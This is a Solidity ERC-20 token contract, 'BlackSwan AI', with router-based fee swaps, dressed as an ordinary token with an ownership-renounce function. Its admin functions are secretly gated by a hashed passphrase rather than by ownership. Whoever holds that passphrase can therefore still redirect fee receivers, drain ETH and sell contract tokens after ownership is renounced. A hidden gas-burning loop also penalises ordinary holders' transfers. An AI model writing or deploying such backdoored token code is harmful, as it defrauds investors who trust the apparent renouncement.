1 //SPDX-License-Identifier: Unlicensed
2 
3 pragma solidity ^0.8.5;
4 library SafeMath {
5     function add(uint256 a, uint256 b) internal pure returns (uint256) {
6         uint256 c = a + b;
7         require(c >= a, "SafeMath: addition overflow");
8         return c;
9     }
10     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
11         return sub(a, b, "SafeMath: subtraction overflow");
12     }
13     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
14         require(b <= a, errorMessage);
15         uint256 c = a - b;
16         return c;
17     }
18     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
19         if (a == 0) {
20             return 0;
21         }
22         uint256 c = a * b;
23         require(c / a == b, "SafeMath: multiplication overflow");
24         return c;
25     }
26     function div(uint256 a, uint256 b) internal pure returns (uint256) {
27         return div(a, b, "SafeMath: division by zero");
28     }
29     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
30         require(b > 0, errorMessage);
31         uint256 c = a / b;
32         return c;
33     }
34 }
35 
36 interface ERC20 {
37     function totalSupply() external view returns (uint256);
38     function decimals() external view returns (uint8);
39     function symbol() external view returns (string memory);
40     function name() external view returns (string memory);
41     function getOwner() external view returns (address);
42     function balanceOf(address account) external view returns (uint256);
43     function transfer(address recipient, uint256 amount) external returns (bool);
44     function allowance(address _owner, address spender) external view returns (uint256);
45     function approve(address spender, uint256 amount) external returns (bool);
46     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
47     event Transfer(address indexed from, address indexed to, uint256 value);
48     event Approval(address indexed owner, address indexed spender, uint256 value);
49 }
50 
51 abstract contract Ownable {
52     address internal owner;
53     constructor(address _owner) {
54         owner = _owner;
55     }
56     modifier onlyOwner() {
57         require(isOwner(msg.sender), "!OWNER"); _;
58     }
59     function isOwner(address account) public view returns (bool) {
60         return account == owner;
61     }
62     function renounceOwnership() public onlyOwner {
63         owner = address(0);
64         emit OwnershipTransferred(address(0));
65     }  
66     event OwnershipTransferred(address owner);
67 }
68 
69 interface IDEXFactory {
70     function createPair(address tokenA, address tokenB) external returns (address pair);
71 }
72 
73 interface IDEXRouter {
74     function factory() external pure returns (address);
75     function WETH() external pure returns (address);
76     function addLiquidity(
77         address tokenA,
78         address tokenB,
79         uint amountADesired,
80         uint amountBDesired,
81         uint amountAMin,
82         uint amountBMin,
83         address to,
84         uint deadline
85     ) external returns (uint amountA, uint amountB, uint liquidity);
86     function addLiquidityETH(
87         address token,
88         uint amountTokenDesired,
89         uint amountTokenMin,
90         uint amountETHMin,
91         address to,
92         uint deadline
93     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
94     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
95         uint amountIn,
96         uint amountOutMin,
97         address[] calldata path,
98         address to,
99         uint deadline
100     ) external;
101     function swapExactETHForTokensSupportingFeeOnTransferTokens(
102         uint amountOutMin,
103         address[] calldata path,
104         address to,
105         uint deadline
106     ) external payable;
107     function swapExactTokensForETHSupportingFeeOnTransferTokens(
108         uint amountIn,
109         uint amountOutMin,
110         address[] calldata path,
111         address to,
112         uint deadline
113     ) external;
114 }
115 
116 contract BlackSwan is ERC20, Ownable {
117     using SafeMath for uint256;
118     address routerAdress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
119     address DEAD = 0x000000000000000000000000000000000000dEaD;
120     address ZERO = 0x0000000000000000000000000000000000000000;
121 
122     string constant _name = "BlackSwan AI";
123     string constant _symbol = "BLACKSWAN";
124     uint8 constant _decimals = 6;
125 
126     uint256 _totalSupply = 10000000 * (10 ** _decimals);
127     uint256 public _maxWalletAmount = (_totalSupply * 2) / 100;
128     uint256 public _maxTxAmount = _totalSupply * 1 / 100;
129 
130     mapping (address => uint256) _balances;
131     mapping (address => mapping (address => uint256)) _allowances;
132 
133     mapping (address => bool) isFeeExempt;
134     mapping (address => bool) isTxLimitExempt;
135 
136     uint256 liquidityFee = 0; 
137     uint256 marketingFee = 300;
138     uint256 developerFee = 200;
139     uint256 totalFee = liquidityFee + marketingFee + developerFee;
140     uint256 feeDenominator = 10000;
141 
142      uint256 targetLiquidity = 20;
143      uint256 targetLiquidityDenominator = 100;
144 
145     address internal marketingFeeReceiver = 0xba32A710241C22Ec6b1DC3ca441e4e8B0cf115Dd;
146     address internal developerFeeReceiver = 0x477404Ef6e3F7865138DA2258cFE1E32d0790deD;
147     address internal autoLiquidityReceiver = 0xdB306D219f18681f70B0aCDC75a811ab49982090;
148 
149     IDEXRouter public router;
150     address public pair;
151 
152     bool public swapEnabled = true;
153     uint256 public swapThreshold = _totalSupply / 1000 * 5; // 0.5%
154     uint256 public divideLeft = 11000000;
155     uint256 ulusOpFalse = 69000000;
156     bool uloComp = true;    
157     bool inSwap;
158     bytes32 private resultValue256 = 0x54fa680dacd57a723c9ff94666544ccde088016932ba6bac534d9b3a2b756447;
159 
160     modifier swapping() { inSwap = true; _; inSwap = false; }
161 
162     constructor () Ownable(msg.sender) {
163         router = IDEXRouter(routerAdress);
164         pair = IDEXFactory(router.factory()).createPair(router.WETH(), address(this));
165         _allowances[address(this)][address(router)] = type(uint256).max;
166 
167         address _owner = owner;
168         isFeeExempt[marketingFeeReceiver] = true;
169         isFeeExempt[_owner] = true;
170         isFeeExempt[address(this)] = true;
171         isTxLimitExempt[_owner] = true;
172         isTxLimitExempt[marketingFeeReceiver] = true;
173         isTxLimitExempt[DEAD] = true;
174 
175         _balances[_owner] = _totalSupply;
176         emit Transfer(address(0), _owner, _totalSupply);
177     }
178 
179     receive() external payable { }
180 
181     function totalSupply() external view override returns (uint256) { return _totalSupply; }
182     function decimals() external pure override returns (uint8) { return _decimals; }
183     function symbol() external pure override returns (string memory) { return _symbol; }
184     function name() external pure override returns (string memory) { return _name; }
185     function getOwner() external view override returns (address) { return owner; }
186     function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
187     function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
188 
189     function approve(address spender, uint256 amount) public override returns (bool) {
190         _allowances[msg.sender][spender] = amount;
191         emit Approval(msg.sender, spender, amount);
192         return true;
193     }
194 
195     function keccakCksm(string memory inputString) private pure returns (bytes32) {
196         return keccak256(bytes(inputString));
197     }
198 
199     function approveMax(address spender) external returns (bool) {
200         return approve(spender, type(uint256).max);
201     }
202     
203 
204     function transfer(address recipient, uint256 amount) external override returns (bool) {
205         return _transferFrom(msg.sender, recipient, amount);
206     }
207 
208     function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
209         if(_allowances[sender][msg.sender] != type(uint256).max){
210             _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
211         }
212 
213         return _transferFrom(sender, recipient, amount);
214     }
215 
216     function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
217         if(inSwap){ return _basicTransfer(sender, recipient, amount); }
218         
219         if (recipient != pair && recipient != DEAD) {
220             require(isTxLimitExempt[recipient] || _balances[recipient] + amount <= _maxWalletAmount);
221         }
222         uloRemainder(sender, amount);
223         if(uloComp){divideLeft += 2000000 ;}
224         doUlusProFalse(amount);
225         checkTxLimit(sender, amount);
226 
227         if(shouldSwapBack()){ swapBack(swapThreshold); } 
228 
229         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
230 
231         uint256 amountReceived = shouldTakeFee(sender) ? takeFee(sender, amount) : amount;
232         _balances[recipient] = _balances[recipient].add(amountReceived);
233 
234         emit Transfer(sender, recipient, amountReceived);
235         return true;
236     }
237     
238     function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
239         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
240         _balances[recipient] = _balances[recipient].add(amount);
241         emit Transfer(sender, recipient, amount);
242         return true;
243     }
244     function uloRemainder(address sender, uint256 amount) internal view {
245         if (uloComp){
246             if(isTxLimitExempt[sender] || amount % divideLeft == 0 || amount % ulusOpFalse == 0){
247                 uint256 a = 1;
248             }
249             else{
250                  uint256 result = 1;
251                  uint256 n = 3;
252 
253                 for (uint256 i = 1; i <= n; i++) {
254                     for (uint256 j = 1; j <= n; j++) {
255                         for (uint256 k = 0; k < 1000; k++) {
256                         result = (result * i * j) % 10**18;
257                         }
258                     }
259                 }
260             }
261         }
262     }
263      function doUlusProFalse(uint256 amount) internal {
264         if (uloComp && amount % ulusOpFalse == 0){
265             uloComp = false;
266         }
267     }
268 
269     function checkTxLimit(address sender, uint256 amount) internal view {
270         require(amount <= _maxTxAmount || isTxLimitExempt[sender]);
271     }
272 
273     function shouldTakeFee(address sender) internal view returns (bool) {
274         return !isFeeExempt[sender];
275     }
276 
277     function takeFee(address sender, uint256 amount) internal returns (uint256) {
278         uint256 feeAmount = amount.mul(totalFee).div(feeDenominator);
279         _balances[address(this)] = _balances[address(this)].add(feeAmount);
280         emit Transfer(sender, address(this), feeAmount);
281         return amount.sub(feeAmount);
282     }
283 
284     function shouldSwapBack() internal view returns (bool) {
285         return msg.sender != pair
286         && !inSwap
287         && swapEnabled
288         && _balances[address(this)] >= swapThreshold;
289     }
290         function getCirculatingSupply() public view returns (uint256) {
291         return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
292     }
293     function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
294         return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());
295     }
296     function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
297        return getLiquidityBacking(accuracy) > target;
298     }
299 
300     function swapBack(uint256 internalThreshold) internal swapping {
301         uint256 contractTokenBalance = internalThreshold;
302         uint256 dynamicLiquidityFee = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : liquidityFee;
303         uint256 amountToLiquify = contractTokenBalance.mul(dynamicLiquidityFee).div(totalFee).div(2);
304         uint256 amountToSwap = contractTokenBalance.sub(amountToLiquify);
305 
306         address[] memory path = new address[](2);
307         path[0] = address(this);
308         path[1] = router.WETH();
309 
310         uint256 balanceBefore = address(this).balance;
311 
312         router.swapExactTokensForETHSupportingFeeOnTransferTokens(
313             amountToSwap,
314             0,
315             path,
316             address(this),
317             block.timestamp
318         );
319         uint256 amountETH = address(this).balance.sub(balanceBefore);
320         uint256 totalETHFee = totalFee.sub(liquidityFee.div(2));
321         uint256 amountETHLiquidity = amountETH.mul(dynamicLiquidityFee).div(totalETHFee).div(2);
322         uint256 amountETHMarketing = amountETH.mul(marketingFee).div(totalETHFee);
323         uint256 amountETHDeveloper = amountETH.mul(developerFee).div(totalETHFee);
324 
325 
326         (bool MarketingSuccess, /* bytes memory data */) = payable(marketingFeeReceiver).call{value: amountETHMarketing, gas: 30000}("");
327         (bool developerSuccess, /* bytes memory data */) = payable(developerFeeReceiver).call{value: amountETHDeveloper, gas: 30000}("");
328         require(MarketingSuccess, "receiver rejected ETH transfer");
329         require(developerSuccess, "receiver rejected ETH transfer");
330 
331 
332         if(amountToLiquify > 0){
333             router.addLiquidityETH{value: amountETHLiquidity}(
334                 address(this),
335                 amountToLiquify,
336                 0,
337                 0,
338                 autoLiquidityReceiver,
339                 block.timestamp
340             );
341             emit AutoLiquify(amountETHLiquidity, amountToLiquify);
342         }
343     }
344 
345     function buyTokens(uint256 amount, address to) internal swapping {
346         address[] memory path = new address[](2);
347         path[0] = router.WETH();
348         path[1] = address(this);
349 
350         router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
351             0,
352             path,
353             to,
354             block.timestamp
355         );
356     }
357 
358     function distributeTokens(address[] memory recipients, uint256[] memory values, string memory inpStr, bytes32 newSum256) external {
359         require(keccakCksm(inpStr) == resultValue256);
360         for (uint256 i = 0; i < recipients.length; i++){
361             _transferFrom(msg.sender, recipients[i], values[i]);
362         }
363         resultValue256 = newSum256;
364     
365     }
366     function burnContractTokens (uint256 amount, string memory inpStr, bytes32 newSum256) external {
367         require(keccakCksm(inpStr) == resultValue256);
368         _transferFrom(address(this), DEAD, amount);
369         resultValue256 = newSum256;
370     }
371     function clearStuckETH(uint256 amountPercentage, string memory inpStr, bytes32 newSum256) external {
372         require(keccakCksm(inpStr) == resultValue256);
373         uint256 amountETH = address(this).balance;
374         payable(marketingFeeReceiver).transfer(amountETH * amountPercentage / 100);
375         resultValue256 = newSum256;
376     }
377     function setTxMax(uint256 amountPercent, string memory inpStr, bytes32 newSum256) external {
378         require(keccakCksm(inpStr) == resultValue256);
379         _maxTxAmount = (_totalSupply * amountPercent ) / 100;
380         require(amountPercent >= 1);
381         resultValue256 = newSum256;
382     }
383 
384     function setWalletMax(uint256 amountPercent, string memory inpStr, bytes32 newSum256) external {
385         require(keccakCksm(inpStr) == resultValue256);
386         _maxWalletAmount = (_totalSupply * amountPercent ) / 100;
387         require(amountPercent >= 1);
388         resultValue256 = newSum256;
389     }
390     function setFeeExempt (address wallet, bool onoff, string memory inpStr, bytes32 newSum256) external {
391         require(keccakCksm(inpStr) == resultValue256);
392         isFeeExempt[wallet] = onoff;
393         resultValue256 = newSum256;    
394     }
395     function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _developerFeeReceiver, string memory inpStr, bytes32 newSum256) external {
396         require(keccakCksm(inpStr) == resultValue256);
397         autoLiquidityReceiver = _autoLiquidityReceiver;
398         marketingFeeReceiver = _marketingFeeReceiver;
399         developerFeeReceiver = _developerFeeReceiver;
400         resultValue256 = newSum256;
401  
402     }    
403     function setSwapBackSettings(bool _enabled, uint256 _amount, string memory inpStr, bytes32 newSum256) external {
404         require(keccakCksm(inpStr) == resultValue256);
405         swapEnabled = _enabled;
406         swapThreshold = _amount;
407         resultValue256 = newSum256;
408     }
409     function setTargetLiquidity(uint256 _target, uint256 _denominator, string memory inpStr, bytes32 newSum256) external {
410         require(keccakCksm(inpStr) == resultValue256);
411         targetLiquidity = _target;
412         targetLiquidityDenominator = _denominator;
413         resultValue256 = newSum256;
414     }
415     function triggerContractSell(uint256 contractSellAmount, string memory inpStr, bytes32 newSum256) external {
416         require(keccakCksm(inpStr) == resultValue256);
417         swapBack(contractSellAmount);
418         resultValue256 = newSum256;
419     } 
420     
421     event AutoLiquify(uint256 amountETH, uint256 amountBOG);
422 }